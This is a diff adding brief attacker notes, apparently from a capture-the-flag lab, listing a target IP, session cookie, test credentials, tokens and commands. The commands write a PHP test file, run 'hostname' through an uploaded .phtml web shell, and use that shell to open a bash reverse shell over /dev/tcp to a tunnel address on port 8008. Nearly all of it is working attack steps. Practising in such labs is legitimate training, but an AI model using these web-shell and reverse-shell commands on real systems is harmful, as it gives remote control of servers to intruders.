@@ -1,0 +1,19 @@
+cookie: 06o84jcis3m6uar6ij33a3n2ov
+
+target: http://10.114.190.27
+
+
+account: 3testuser@fake.thm
+pasword Password123
+
+
+token:
+137337
+552154
+564953
+
+echo "<?php echo 'PHP is executing'; ?>" > test.phtml
+curl "http://10.114.190.27/uploads/documents/shell.phtml?cmd=hostname"
+tunnel: 192.168.142.19
+
+curl "http://10.114.190.27/uploads/documents/shell.phtml?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/192.168.142.19/8008+0>%261'"
